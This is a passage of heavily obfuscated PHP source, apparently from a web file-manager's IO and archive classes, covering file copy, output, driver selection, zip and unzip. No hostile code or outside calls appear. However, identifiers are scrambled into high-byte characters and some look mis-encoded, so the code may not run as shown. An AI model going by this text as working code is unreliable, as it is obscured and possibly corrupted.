$ˆËÛÎæ© = $ï”‡ñ½Ï->download($ÇÁ½Ê’³, $ˆËÛÎæ©); $ˆËÛÎæ© = $ï”‡ñ½Ï->iconvApp($ˆËÛÎæ©); if (substr($ˆËÛÎæ©, strlen($ï³‘¦‘Ù)) == $ï³‘¦‘Ù) { $Ğ€„¸Ï¯ = !0; } $×¨ÌãÂÎ = $Ğ™§ãÏø->upload($ëÛŒ£á†, $ˆËÛÎæ©, $Ğ€„¸Ï¯); self::remove($©ö…ª); Hook::trigger($ĞùÑÌàä[1164], $ï”‡ñ½Ï, $ÇÁ½Ê’³, $Ğ™§ãÏø, $ëÛŒ£á†, $ô­Ÿ¤µ, $×¨ÌãÂÎ); self::copyMoveKeepInfo($ï”‡ñ½Ï, $ÇÁ½Ê’³, $×¨ÌãÂÎ); return $×¨ÌãÂÎ; } private static function copyMoveKeepInfo($¾Ò‘éü«, $¿íˆ¼ƒû, $÷ìâ¶“³) { if (!$÷ìâ¶“³) { return; } $ÎĞúÃ¯Û = $¾Ò‘éü«->info($¿íˆ¼ƒû); if (!is_array($ÎĞúÃ¯Û)) { return; } IO::setModifyTime($÷ìâ¶“³, $ÎĞúÃ¯Û[$_SERVER[Ì¥ŞÒ°£][85]]); } public static function pathFather($¸ÄâäÛÛ) { $Í¾şÄÌ¨ = IO::init($¸ÄâäÛÛ); $Ø­»Éõ¯ = $Í¾şÄÌ¨->pathFather($Í¾şÄÌ¨->path); return $Í¾şÄÌ¨->getPathOuter($Ø­»Éõ¯); } public static function fileOut($çÚÄ„í, $¨Êíä¯ö = false, $àÛ“²«Ï = false, $˜Ëñª”‰ = '') { $°ç«İ = self::driverMake($çÚÄ„í); if ($°ç«İ->isFileOutServer()) { return $°ç«İ->fileOutServer($çÚÄ„í, $¨Êíä¯ö, $àÛ“²«Ï, $˜Ëñª”‰); } return $°ç«İ->fileOut($çÚÄ„í, $¨Êíä¯ö, $àÛ“²«Ï, $˜Ëñª”‰); } public static function fileOutImage($±§©ˆ›¢, $òÜ‚Üâ† = 250) { $£¹‹ôñ— = array(250, 600, 1200, 2000, 3000, 5000); for ($íã—µÆó = 0; $íã—µÆó < count($£¹‹ôñ—); $íã—µÆó++) { if ($íã—µÆó == 0 && $òÜ‚Üâ† <= $£¹‹ôñ—[$íã—µÆó]) { $òÜ‚Üâ† = $£¹‹ôñ—[$íã—µÆó]; break; } else { if ($òÜ‚Üâ† > $£¹‹ôñ—[$íã—µÆó - 1] && $òÜ‚Üâ† <= $£¹‹ôñ—[$íã—µÆó]) { $òÜ‚Üâ† = $£¹‹ôñ—[$íã—µÆó]; break; } else { if ($íã—µÆó == count($£¹‹ôñ—) - 1 && $òÜ‚Üâ† > $£¹‹ôñ—[$íã—µÆó]) { $òÜ‚Üâ† = $£¹‹ôñ—[$íã—µÆó]; break; } } } } $Û“ãü“¶ = self::driverMake($±§©ˆ›¢); if ($Û“ãü“¶->isFileOutServer()) { return $Û“ãü“¶->fileOutImageServer($±§©ˆ›¢, $òÜ‚Üâ†); } return $Û“ãü“¶->fileOutImage($±§©ˆ›¢, $òÜ‚Üâ†); } private static function driverIsSame($´Ú©Šñ«, $üÍšàŠ) { $Õ°âÄÙ˜ =& $_SERVER[Ì¥ŞÒ°£]; $Ö”‘ûÊ = $´Ú©Šñ«->getType(); $¶ªìâıø = $üÍšàŠ->getType(); if ($Ö”‘ûÊ != $¶ªìâıø) { return !1; } if ($Ö”‘ûÊ == $Õ°âÄÙ˜[760]) { return !0; } if ($Ö”‘ûÊ == $Õ°âÄÙ˜[106]) { return !0; } if ($´Ú©Šñ«->pathDriver == $üÍšàŠ->pathDriver) { return !0; } return !1; } public static function copyUpdate($åµ£Î‰†, $œ“½Šâû) { $ÄØÆä¾ =& $_SERVER[Ì¥ŞÒ°£]; if (!IO::exist($åµ£Î‰†)) { return !1; } if (!IO::exist($œ“½Šâû)) { IO::mkdir($œ“½Šâû); } $éÆ™¡½– = self::_listAll($åµ£Î‰†); $‰Ø»óš˜ = self::_listAll($œ“½Šâû); $´™§ıª = array(); $Ç†¢£ô· = array(); foreach ($éÆ™¡½– as $Š´”şé => $ñí•Ø§) { if (isset($‰Ø»óš˜[$Š´”şé])) { if ($ñí•Ø§[$ÄØÆä¾[75]] == 1) { continue; } if ($‰Ø»óš˜[$Š´”şé][$ÄØÆä¾[76]] == $ñí•Ø§[$ÄØÆä¾[76]]) { continue; } } if ($ñí•Ø§[$ÄØÆä¾[75]] == 1) { $Ç†¢£ô·[] = $œ“½Šâû . $ÄØÆä¾[8] . $Š´”şé; continue; } $®ÖåÄàÇ = strstr(trim($Š´”şé, $ÄØÆä¾[8]), $ÄØÆä¾[8]) ? get_path_father($Š´”şé) : $ÄØÆä¾[12]; $´™§ıª[] = array($ÄØÆä¾[1165] => $ñí•Ø§[$ÄØÆä¾[84]], $ÄØÆä¾[1166] => rtrim($œ“½Šâû, $ÄØÆä¾[8]) . $ÄØÆä¾[8] . $®ÖåÄàÇ, $ÄØÆä¾[1167] => $ñí•Ø§); } $š÷×ÎÜŸ = array($ÄØÆä¾[199] => $´™§ıª, $ÄØÆä¾[75] => $Ç†¢£ô·); Hook::trigger($ÄØÆä¾[1168], $åµ£Î‰†, $œ“½Šâû, $š÷×ÎÜŸ); foreach ($Ç†¢£ô· as $ñí•Ø§) { IO::mkdir($ñí•Ø§); } foreach ($´™§ıª as $ñí•Ø§) { IO::copy($ñí•Ø§[$ÄØÆä¾[1165]], $ñí•Ø§[$ÄØÆä¾[1166]], REPEAT_REPLACE); } } private static function _listAll($ëÌ½ßàÑ) { $éµÎ–ô‡ =& $_SERVER[Ì¥ŞÒ°£]; $ëÌ½ßàÑ = KodIO::clear($ëÌ½ßàÑ); $£ìæéåŸ = IO::listAll($ëÌ½ßàÑ); foreach ($£ìæéåŸ as &$ºéîˆæ) { $…Š¥áö¯ = substr($ºéîˆæ[$éµÎ–ô‡[84]], strlen($ëÌ½ßàÑ)); $ºéîˆæ[$éµÎ–ô‡[1169]] = trim($…Š¥áö¯, $éµÎ–ô‡[8]); } unset($ºéîˆæ); return array_to_keyvalue($£ìæéåŸ, $éµÎ–ô‡[1169]); } public static function fileSubstr($°İØ—êÀ, $ñ£ñÉ ´, $ãÇÑ ‚ = false) { $êğ…àã– =& $_SERVER[Ì¥ŞÒ°£]; $İˆ˜üÓ = self::driverMake($°İØ—êÀ); $Ø÷‚°ï = $İˆ˜üÓ->size($°İØ—êÀ); $¯Æ °ÇŠ = $ñ£ñÉ ´; $·ŠÓ…½ = $ãÇÑ ‚; if ($ñ£ñÉ ´ < 0) { $ñ£ñÉ ´ = $Ø÷‚°ï + $ñ£ñÉ ´; } if ($ãÇÑ ‚ === !1) { $ãÇÑ ‚ = $Ø÷‚°ï - $ñ£ñÉ ´; } if ($ñ£ñÉ ´ + $ãÇÑ ‚ > $Ø÷‚°ï) { $ãÇÑ ‚ = $Ø÷‚°ï - $ñ£ñÉ ´; } if (!$Ø÷‚°ï && $İˆ˜üÓ->getType() == $êğ…àã–[106] && !$İˆ˜üÓ->exist($°İØ—êÀ)) { $ê¥úÈÄ = get_path_this($°İØ—êÀ); $“¦öÃ…³ = parse_url_query($ê¥úÈÄ); if (is_array($“¦öÃ…³) && isset($“¦öÃ…³[$êğ…àã–[32]])) { $ê¥úÈÄ = urldecode($“¦öÃ…³[$êğ…àã–[32]]); } throw new Exception($êğ…àã–[1170] . LNG($êğ…àã–[1171]) . $êğ…àã–[971] . clear_html($ê¥úÈÄ) . $êğ…àã–[12]); } if ($ãÇÑ ‚ <= 0) { return $êğ…àã–[12]; } if ($ñ£ñÉ ´ < 0 || $ñ£ñÉ ´ >= $Ø÷‚°ï || $ãÇÑ ‚ > 1024 * 1024 * 10) { throw new Exception("\146\151\154\x65\122\145\141\x64\x20\x65\x72\162\157\162\41\40\x73\x74\141\x72\164\x3d{$ñ£ñÉ ´}\73\x6c\x65\x6e\x67\x74\x68\75{$ãÇÑ ‚}\x3b\40\163\151\x7a\145\x3d{$Ø÷‚°ï}\x3b"); } $˜ªÒòƒÏ = $İˆ˜üÓ->fileSubstr($°İØ—êÀ, $ñ£ñÉ ´, $ãÇÑ ‚); if (!$˜ªÒòƒÏ && $ãÇÑ ‚ && isset($GLOBALS[$êğ…àã–[1172]])) { throw new Exception($GLOBALS[$êğ…àã–[1172]][$êğ…àã–[1173]]); } return $˜ªÒòƒÏ; } private static function driverMake(&$õíÇÒÕ) { $ğÀÒÚöï =& $_SERVER[Ì¥ŞÒ°£]; $šš®ŸøŸ = KodIO::parse($õíÇÒÕ); if (!self::$driverListSystem) { $ÚÈÉ¹”ş = Model($ğÀÒÚöï[769])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÚÈÉ¹”ş, $ğÀÒÚöï[399]); } if ($šš®ŸøŸ[$ğÀÒÚöï[33]] == KodIO::KOD_IO && !self::$driverListSystem[$šš®ŸøŸ[$ğÀÒÚöï[399]]]) { return !1; } $õíÇÒÕ = $šš®ŸøŸ[$ğÀÒÚöï[1174]]; $ıøÜàá = self::driverGet($šš®ŸøŸ, $õíÇÒÕ); return $ıøÜàá; } private static function driverGet($¢íŞåŞô, &$”…îÛ‡Š) { $ë›óÅ Á =& $_SERVER[Ì¥ŞÒ°£]; $œ´çŒòç = $¢íŞåŞô[$ë›óÅ Á[1175]]; $³³¢ş™ = $¢íŞåŞô[$ë›óÅ Á[399]]; switch ($¢íŞåŞô[$ë›óÅ Á[33]]) { case KodIO::KOD_IO: $ë× ¶™‡ = self::$driverListSystem[$³³¢ş™]; break; case KodIO::KOD_SOURCE: $”…îÛ‡Š = $³³¢ş™ . $”…îÛ‡Š; $ë× ¶™‡ = array($ë›óÅ Á[1176] => $ë›óÅ Á[1177], $ë›óÅ Á[6] => $¢íŞåŞô); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Å«„ÁÔÙ = $GLOBALS[$ë›óÅ Á[1178]]; self::$driverListUser = array_to_keyvalue($Å«„ÁÔÙ, $ë›óÅ Á[399]); } $ë× ¶™‡ = self::$driverListUser[$³³¢ş™]; break; case KodIO::KOD_SHARE_LINK: $ë× ¶™‡ = array($ë›óÅ Á[1176] => $ë›óÅ Á[1179], $ë›óÅ Á[6] => $¢íŞåŞô); $Ùû¤ñÛ® = Action($ë›óÅ Á[1180])->sharePathInfo($¢íŞåŞô[$ë›óÅ Á[84]]); $”…îÛ‡Š = $Ùû¤ñÛ®[$ë›óÅ Á[402]]; if (!$Ùû¤ñÛ®[$ë›óÅ Á[402]]) { $ÈòÅÇöî = Model($ë›óÅ Á[601])->getInfo($Ùû¤ñÛ®[$ë›óÅ Á[489]]); $”…îÛ‡Š = KodIO::clear($ÈòÅÇöî[$ë›óÅ Á[1181]] . $¢íŞåŞô[$ë›óÅ Á[1174]]); $¢íŞåŞô[$ë›óÅ Á[487]] = $ÈòÅÇöî; $¢íŞåŞô[$ë›óÅ Á[1156]] = $”…îÛ‡Š; $ë× ¶™‡ = array($ë›óÅ Á[1176] => $ë›óÅ Á[1182], $ë›óÅ Á[6] => $¢íŞåŞô); } break; case KodIO::KOD_SHARE_ITEM: $ë× ¶™‡ = array($ë›óÅ Á[1176] => $ë›óÅ Á[1183], $ë›óÅ Á[6] => $¢íŞåŞô); $ÈòÅÇöî = Model($ë›óÅ Á[601])->getInfo($¢íŞåŞô[$ë›óÅ Á[399]]); if ($ÈòÅÇöî[$ë›óÅ Á[402]] == $ë›óÅ Á[197]) { $”…îÛ‡Š = KodIO::clear($ÈòÅÇöî[$ë›óÅ Á[1181]] . $¢íŞåŞô[$ë›óÅ Á[1174]]); $¢íŞåŞô[$ë›óÅ Á[487]] = $ÈòÅÇöî; $¢íŞåŞô[$ë›óÅ Á[1156]] = $”…îÛ‡Š; $ë× ¶™‡ = array($ë›óÅ Á[1176] => $ë›óÅ Á[1184], $ë›óÅ Á[6] => $¢íŞåŞô); } else { if (!$”…îÛ‡Š) { $”…îÛ‡Š = $ÈòÅÇöî[$ë›óÅ Á[402]]; } } break; default: $”…îÛ‡Š = $¢íŞåŞô[$ë›óÅ Á[84]]; $ë× ¶™‡ = array($ë›óÅ Á[1176] => $ë›óÅ Á[1185]); break; } $—¢·÷½º = $¢íŞåŞô[$ë›óÅ Á[84]]; if (!isset(self::$driverCache[$—¢·÷½º])) { $—åÂÁØ = strtolower($ë× ¶™‡[$ë›óÅ Á[95]]); $Ú¸…ÚßÀ = $GLOBALS[$ë›óÅ Á[6]][$ë›óÅ Á[89]][$ë›óÅ Á[828]]; $Õı‚²…Ú = $ë›óÅ Á[74] . (isset($Ú¸…ÚßÀ[$—åÂÁØ]) ? $Ú¸…ÚßÀ[$—åÂÁØ] : ucfirst($—åÂÁØ)); if (!class_exists($Õı‚²…Ú)) { show_json("{$Õı‚²…Ú}\40\x6e\x6f\164\x20\145\170\x69\x73\x74\163\x21", !1); } $Û•Î¢Å¬ = isset($ë× ¶™‡[$ë›óÅ Á[6]]) ? $ë× ¶™‡[$ë›óÅ Á[6]] : !1; self::$driverCache[$—¢·÷½º] = new $Õı‚²…Ú($Û•Î¢Å¬); } $òêÇ¨Æ· = self::$driverCache[$—¢·÷½º]; $òêÇ¨Æ·->pathDriver = $œ´çŒòç; $òêÇ¨Æ·->pathBase = $ë›óÅ Á[12]; if (isset($ë× ¶™‡[$ë›óÅ Á[6]][$ë›óÅ Á[1186]])) { $òêÇ¨Æ·->pathBase = rtrim($ë× ¶™‡[$ë›óÅ Á[6]][$ë›óÅ Á[1186]], $ë›óÅ Á[8]) . $ë›óÅ Á[8]; $”…îÛ‡Š = $òêÇ¨Æ·->pathBase . ltrim($”…îÛ‡Š, $ë›óÅ Á[8]); } $”…îÛ‡Š = $òêÇ¨Æ·->getPath($”…îÛ‡Š); if (isset($¢íŞåŞô[$ë›óÅ Á[1156]])) { $”…îÛ‡Š = $¢íŞåŞô[$ë›óÅ Á[1156]]; } $òêÇ¨Æ·->path = $”…îÛ‡Š; return $òêÇ¨Æ·; } public static function errorTips($ú“ìÉ”ƒ = false) { $¯ô“”ßè =& $_SERVER[Ì¥ŞÒ°£]; static $öï”ß²å = array(); $šùëöà = 1000; if ($ú“ìÉ”ƒ === -1) { return $öï”ß²å ? $öï”ß²å[count($öï”ß²å) - 1] : $¯ô“”ßè[12]; } if ($ú“ìÉ”ƒ === !1) { return implode($¯ô“”ßè[231], $öï”ß²å); } if (count($öï”ß²å) >= $šùëöà) { $öï”ß²å = array_slice($öï”ß²å, $šùëöà * 0.5, $šùëöà); } $öï”ß²å[] = $ú“ìÉ”ƒ; write_log($¯ô“”ßè[162] . ACTION . $¯ô“”ßè[1187] . $ú“ìÉ”ƒ, $¯ô“”ßè[1188]); } public static function getLastError($ßÍÔ‡« = '') { $£µˆÒÌ– = self::errorTips(-1); return $£µˆÒÌ– ? $£µˆÒÌ– : $ßÍÔ‡«; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $î­É…Ö; if ($î­É…Ö) { return $î­É…Ö; } $¦Í’²ŸŞ = IO::init($_SERVER[Ì¥ŞÒ°£][8]); return $¦Í’²ŸŞ; } private static function iconvSystem($Ã²Õ¡Æˆ) { return self::local()->iconvSystem($Ã²Õ¡Æˆ); } private static function iconvApp($ŸÇ‚—Ï») { return self::local()->iconvApp($ŸÇ‚—Ï»); } public static function zipFolder($÷ó¥ùÑ¡, $Å»î¥Ì’ = "\172\151\160", $ïÒ—ˆŒ = '', $¹ÆîÂèê = REPEAT_RENAME) { $œœİêğ‚ =& $_SERVER[Ì¥ŞÒ°£]; $ì¦•¾ä¸ = IO::listPath($÷ó¥ùÑ¡); if (!$ì¦•¾ä¸) { return !1; } $ì¦•¾ä¸ = array_merge($ì¦•¾ä¸[$œœİêğ‚[82]], $ì¦•¾ä¸[$œœİêğ‚[83]]); return self::zip($ì¦•¾ä¸, $Å»î¥Ì’, $ïÒ—ˆŒ, $¹ÆîÂèê); } public static function zip($·„ø®­, $İÑ‚¨Í = "\172\151\x70", $²ŒÑºÃè = '', $°œ¬˜ª’ = REPEAT_RENAME) { $½½ç¥®Ô =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($·„ø®­) && $·„ø®­) { $·„ø®­ = array(array($½½ç¥®Ô[84] => $·„ø®­)); } $ÙÇò¹ç» = self::init($·„ø®­[0][$½½ç¥®Ô[84]]); $œË¯†º = self::info($·„ø®­[0][$½½ç¥®Ô[84]]); $ÇŠöâ¥À = $½½ç¥®Ô[12]; $•µ®İ = $½½ç¥®Ô[12]; $ÅÛŠ¨Ğú = $½½ç¥®Ô[12]; if ($²ŒÑºÃè) { $•µ®İ = get_path_father($²ŒÑºÃè); $ÅÛŠ¨Ğú = get_path_this($²ŒÑºÃè); } else { $•µ®İ = self::pathFather($œË¯†º[$½½ç¥®Ô[84]]); $ÅÛŠ¨Ğú = $œË¯†º[$½½ç¥®Ô[32]] . $½½ç¥®Ô[10] . $İÑ‚¨Í; if (count($·„ø®­) > 1) { $ˆÜéª° = IO::info($•µ®İ); $ÅÛŠ¨Ğú = $ˆÜéª°[$½½ç¥®Ô[32]] . $½½ç¥®Ô[10] . $İÑ‚¨Í; } } if ($ÙÇò¹ç»->getType() == $½½ç¥®Ô[106]) { $¤‘Ùºİ“ = self::init($•µ®İ); $š´¥¢ƒ“ = $¤‘Ùºİ“->getType() == $½½ç¥®Ô[106] ? $•µ®İ : get_path_father($ÙÇò¹ç»->path); $š´¥¢ƒ“ = rtrim($š´¥¢ƒ“, $½½ç¥®Ô[8]) . $½½ç¥®Ô[8]; mk_dir($š´¥¢ƒ“); } else { $ÇŠöâ¥À = TEMP_FILES . $½½ç¥®Ô[1189] . time() . rand_string(8) . $½½ç¥®Ô[8]; mk_dir($ÇŠöâ¥À); file_put_contents($ÇŠöâ¥À . $½½ç¥®Ô[1190], $½½ç¥®Ô[12]); $š´¥¢ƒ“ = $ÇŠöâ¥À; } $ë¤Ü£”Ÿ = IO::info($š´¥¢ƒ“); if (!$ë¤Ü£”Ÿ || !$ë¤Ü£”Ÿ[$½½ç¥®Ô[202]]) { show_json(LNG($½½ç¥®Ô[1191]), !1); } $±–Û³¿Æ = self::zipFileList($·„ø®­, $ÇŠöâ¥À); foreach ($±–Û³¿Æ as $şš‹æ‰ => $Å€¼Ğ) { $±–Û³¿Æ[$şš‹æ‰] = self::iconvSystem($Å€¼Ğ); } $¶é“½®‰ = get_filename_auto($š´¥¢ƒ“ . $ÅÛŠ¨Ğú, $½½ç¥®Ô[12], $°œ¬˜ª’); KodArchive::create(self::iconvSystem($¶é“½®‰), $±–Û³¿Æ); if (!IO::exist($¶é“½®‰)) { if ($ÇŠöâ¥À) { del_dir($ÇŠöâ¥À); } show_json(LNG($½½ç¥®Ô[1192]), !1); } if (!$ÇŠöâ¥À) { return $¶é“½®‰; } $£Î×Áı = self::move($¶é“½®‰, $•µ®İ, $°œ¬˜ª’); if ($ÇŠöâ¥À) { del_dir($ÇŠöâ¥À); } if (!$¶é“½®‰) { show_json(LNG($½½ç¥®Ô[1192]), !1); } return $£Î×Áı; } public static function unzip($øüşÎ¹É, $ı“¯ƒ©Ä, $õıº¿ê = "\55\x31", $È‹ËÛ°Ä = "\x72\145\x70\x6c\141\x63\145") { $·ÌÁäñ =& $_SERVER[Ì¥ŞÒ°£]; $Î†ºÎ¿‡ = parent::info($øüşÎ¹É); if (!$Î†ºÎ¿‡) { show_json(LNG($·ÌÁäñ[1193]), !1); } $ß—¬ÇøŸ = IO::infoFull($ı“¯ƒ©Ä); if (!$ß—¬ÇøŸ) { $ı“¯ƒ©Ä = IO::mkdir($ı“¯ƒ©Ä); } if (isset($ß—¬ÇøŸ[$·ÌÁäñ[402]]) && trim($ß—¬ÇøŸ[$·ÌÁäñ[84]], $·ÌÁäñ[8]) != trim($ı“¯ƒ©Ä, $·ÌÁäñ[8])) { $ø­èˆÏ… = KodIO::make($ß—¬ÇøŸ[$·ÌÁäñ[432]]); $¶ïğ¹™ = IO::fileNameAuto($ø­èˆÏ…, $ß—¬ÇøŸ[$·ÌÁäñ[32]], REPEAT_RENAME_FOLDER, !0); $ı“¯ƒ©Ä = IO::mkdir($ø­èˆÏ… . $¶ïğ¹™); } $õıº¿ê = $õıº¿ê && $õıº¿ê != $·ÌÁäñ[1194] ? @json_decode($õıº¿ê, !0) : -1; $ÄÑäÂ×± = self::unzipPart($øüşÎ¹É, $õıº¿ê); if (!$ÄÑäÂ×± || !IO::exist($ÄÑäÂ×±[$·ÌÁäñ[199]])) { show_json(LNG($·ÌÁäñ[105]), !1); } $ˆâÏË± = $ÄÑäÂ×±[$·ÌÁäñ[1195]][count($ÄÑäÂ×±[$·ÌÁäñ[1195]]) - 1]; if ($ˆâÏË±[$·ÌÁäñ[1196]] == -1 || substr($ˆâÏË±[$·ÌÁäñ[32]], -1, 1) == $·ÌÁäñ[8]) { $Çö£½§Î = $ÄÑäÂ×±[$·ÌÁäñ[1197]] . rand_string(10) . $·ÌÁäñ[8]; mk_dir($Çö£½§Î); $è Â”õû = count($ÄÑäÂ×±[$·ÌÁäñ[1195]]) == 1 ? IO::ext($øüşÎ¹É) : get_path_ext($ÄÑäÂ×±[$·ÌÁäñ[199]]); $´§ÍÃŒĞ = KodArchive::extract(self::iconvSystem($ÄÑäÂ×±[$·ÌÁäñ[199]]), $Çö£½§Î, $ˆâÏË±[$·ÌÁäñ[1196]], $¶ïğ¹™, $è Â”õû); self::unzipErrorCheck($´§ÍÃŒĞ, array($·ÌÁäñ[1198], $øüşÎ¹É, $è Â”õû, $ı“¯ƒ©Ä, $ÄÑäÂ×±)); Hook::trigger($·ÌÁäñ[1199], $Çö£½§Î); recursion_dir($Çö£½§Î, $„Å¶‹éñ, $ˆ‡®¦àæ, 0); $äà˜ÓÅø = array_merge($„Å¶‹éñ, $ˆ‡®¦àæ); $õö™‚Ï— = array(); foreach ($äà˜ÓÅø as $ƒêæÃŸ½) { $Ş££ƒø¨ = IO::move(self::iconvApp($ƒêæÃŸ½), $ı“¯ƒ©Ä, $È‹ËÛ°Ä); if ($Ş££ƒø¨) { $õö™‚Ï—[] = $Ş££ƒø¨; } } del_dir($Çö£½§Î); } else { $Ş££ƒø¨ = IO::move($ÄÑäÂ×±[$·ÌÁäñ[199]], $ı“¯ƒ©Ä, $È‹ËÛ°Ä, get_path_this($ˆâÏË±[$·ÌÁäñ[32]])); if ($Ş££ƒø¨) { $õö™‚Ï—[] = $Ş££ƒø¨; } } return $õö™‚Ï— ? $õö™‚Ï— : !1; } public static function unzipList($„É³ô€¾) { $…Ááà’ğ =& $_SERVER[Ì¥ŞÒ°£]; $‰ãÊŸ¤ë = isset($„É³ô€¾[$…Ááà’ğ[1200]]) ? $„É³ô€¾[$…Ááà’ğ[1200]] : !1; $âÆ€ãä = isset($„É³ô€¾[$…Ááà’ğ[1196]]) ? @json_decode($„É³ô€¾[$…Ááà’ğ[1196]], !0) : -1; $…©ëŸ‹ = self::unzipPart($„É³ô€¾[$…Ááà’ğ[84]], $âÆ€ãä); if (!$…©ëŸ‹ || !IO::exist($…©ëŸ‹[$…Ááà’ğ[199]])) { show_json(LNG($…Ááà’ğ[105]), !1); } $…¦œÍ¹¾ = $…©ëŸ‹[$…Ááà’ğ[1195]][count($…©ëŸ‹[$…Ááà’ğ[1195]]) - 1]; $²Íë®¨º = in_array(IO::ext($…©ëŸ‹[$…Ááà’ğ[199]]), array($…Ááà’ğ[313], $…Ááà’ğ[1201], $…Ááà’ğ[1202], $…Ááà’ğ[1203], $…Ááà’ğ[1204], $…Ááà’ğ[1205])); if (!$‰ãÊŸ¤ë && ($…¦œÍ¹¾[$…Ááà’ğ[1196]] == -1 || $²Íë®¨º)) { $ó…éáƒå = $…©ëŸ‹[$…Ááà’ğ[1197]] . get_path_this($…©ëŸ‹[$…Ááà’ğ[199]]) . $…Ááà’ğ[1206]; if (!IO::exist($ó…éáƒå)) { $ÌÒ¾ŒŞ¥ = $…¦œÍ¹¾[$…Ááà’ğ[1196]] == -1 ? get_path_ext(IO::pathThis($„É³ô€¾[$…Ááà’ğ[84]])) : get_path_ext($…©ëŸ‹[$…Ááà’ğ[199]]); $ÀµÔÛ¸ = KodArchive::listContent(self::iconvSystem($…©ëŸ‹[$…Ááà’ğ[199]]), !0, $ÌÒ¾ŒŞ¥); self::unzipErrorCheck($ÀµÔÛ¸, array($…Ááà’ğ[1207], $„É³ô€¾, $…©ëŸ‹)); @file_put_contents($ó…éáƒå, json_encode($ÀµÔÛ¸[$…Ááà’ğ[1208]])); } return @json_decode(IO::getContent($ó…éáƒå), !0); } IO::fileOut($…©ëŸ‹[$…Ááà’ğ[199]], $‰ãÊŸ¤ë, get_path_this($…¦œÍ¹¾[$…Ááà’ğ[32]])); die; } private static function zipFileList($¶™š‰Œ, $÷¤Óˆô‘ = false) { $¤¸Ş‰¬Å =& $_SERVER[Ì¥ŞÒ°£]; $¯‘áÃ¢œ = array(); foreach ($¶™š‰Œ as $†İƒ±œø) { $ïŸŒ×÷¤ = $†İƒ±œø[$¤¸Ş‰¬Å[84]]; if ($÷¤Óˆô‘) { $ïŸŒ×÷¤ = self::copy($†İƒ±œø[$¤¸Ş‰¬Å[84]], $÷¤Óˆô‘, $¤¸Ş‰¬Å[820]); } else { $äŒğ˜ç¤ = self::init($†İƒ±œø[$¤¸Ş‰¬Å[84]]); if ($äŒğ˜ç¤->getType() == $¤¸Ş‰¬Å[106]) { $ïŸŒ×÷¤ = $äŒğ˜ç¤->path; } } if ($ïŸŒ×÷¤ && self::local()->exist($ïŸŒ×÷¤)) { $¯‘áÃ¢œ[$†İƒ±œø[$¤¸Ş‰¬Å[84]]] = $ïŸŒ×÷¤; } } if (!empty($¯‘áÃ¢œ)) { return array_values($¯‘áÃ¢œ); } show_json(LNG($¤¸Ş‰¬Å[1171]), !1); } private static function localFilePath($üÅŒµ¨°) { $ßº™¾áİ =& $_SERVER[Ì¥ŞÒ°£]; $Êòñ‰ = KodIO::parse($üÅŒµ¨°); if ($Êòñ‰[$ßº™¾áİ[33]] == KodIO::KOD_SOURCE) { $óæ‹øú÷ = Model($ßº™¾áİ[827])->fileInfoGet(KodIO::sourceID($üÅŒµ¨°)); if (!$óæ‹øú÷[$ßº™¾áİ[84]]) { show_json($ßº™¾áİ[1209], !1); } $üÅŒµ¨° = $óæ‹øú÷[$ßº™¾áİ[84]]; } $‡Â»àíè = self::init($üÅŒµ¨°); if ($‡Â»àíè->pathParse[$ßº™¾áİ[1156]]) { $üÅŒµ¨° = $‡Â»àíè->pathParse[$ßº™¾áİ[1156]]; $‡Â»àíè = self::init($üÅŒµ¨°); } $¤˜øøÌ = $‡Â»àíè->getType(); if ($¤˜øøÌ == $ßº™¾áİ[106] || $¤˜øøÌ == $ßº™¾áİ[1210]) { if (!$‡Â»àíè->exist($‡Â»àíè->path)) { show_json(LNG($ßº™¾áİ[105]), !1); } return $‡Â»àíè->path; } return !1; } public static function unzipPart($çÜõ¼, $”·ƒ€ã× = -1) { $¤º·Ìéß =& $_SERVER[Ì¥ŞÒ°£]; $¿ˆ‘ø­Ã = IO::pathThis($çÜõ¼); if (!$”·ƒ€ã× || $”·ƒ€ã× == -1) { $¾ıæÁúô = array(array($¤º·Ìéß[32] => $¿ˆ‘ø­Ã, $¤º·Ìéß[1196] => -1)); $¾ıæÁúô[0][$¤º·Ìéß[1211]] = $¾ıæÁúô[0][$¤º·Ìéß[32]]; } else { if (is_array($”·ƒ€ã×)) { $¾ıæÁúô = $”·ƒ€ã×; $ÈŒß¥Ï° = count($¾ıæÁúô) - 1; for ($ö¡ğ‹±² = 0; $ö¡ğ‹±² <= $ÈŒß¥Ï°; $ö¡ğ‹±²++) { $—‡Ñòáğ = $¾ıæÁúô[$ö¡ğ‹±²]; $ªÂÜ¿Œâ = get_path_this($—‡Ñòáğ[$¤º·Ìéß[32]]) . (checkExtSafe($—‡Ñòáğ[$¤º·Ìéß[32]]) ? $¤º·Ìéß[12] : $¤º·Ìéß[1212]); $¾ıæÁúô[$ö¡ğ‹±²][$¤º·Ìéß[1211]] = $¤º·Ìéß[1213] . intval($—‡Ñòáğ[$¤º·Ìéß[1196]]) . $¤º·Ìéß[386] . $ªÂÜ¿Œâ; if ($ö¡ğ‹±² == 0) { continue; } $¾ıæÁúô[$ö¡ğ‹±²][$¤º·Ìéß[1211]] = $¾ıæÁúô[$ö¡ğ‹±² - 1][$¤º·Ìéß[1211]] . $¤º·Ìéß[1214] . $¾ıæÁúô[$ö¡ğ‹±²][$¤º·Ìéß[1211]]; } } } if (!is_array($¾ıæÁúô) || count($¾ıæÁúô) == 0) { return !1; } $½Ö¼àËÌ = $¾ıæÁúô[count($¾ıæÁúô) - 1]; if (!IO::exist($çÜõ¼)) { return !1; } $ª‡Í÷şå = TEMP_FILES . $¤º·Ìéß[1215] . kodIO::hashPathSafe($çÜõ¼) . $¤º·Ìéß[8]; $“…¹ÌÄ  = $ª‡Í÷şå . $½Ö¼àËÌ[$¤º·Ìéß[1211]]; mk_dir($ª‡Í÷şå); file_put_contents(TEMP_FILES . $¤º·Ìéß[1190], $¤º·Ìéß[12]); if (IO::exist($“…¹ÌÄ )) { return array($¤º·Ìéß[199] => $“…¹ÌÄ , $¤º·Ìéß[1195] => $¾ıæÁúô, $¤º·Ìéß[1197] => $ª‡Í÷şå); } $ğ‚”ËÉ« = self::localFilePath($çÜõ¼); if (!$ğ‚”ËÉ«) { $ğ‚”ËÉ« = $ª‡Í÷şå . $¤º·Ìéß[1216]; if (!IO::exist($ğ‚”ËÉ«)) { self::copy($çÜõ¼, $ª‡Í÷şå, !1, get_path_this($ğ‚”ËÉ«)); } } if (!$ğ‚”ËÉ« || !IO::exist($ğ‚”ËÉ«)) { return !1; } if 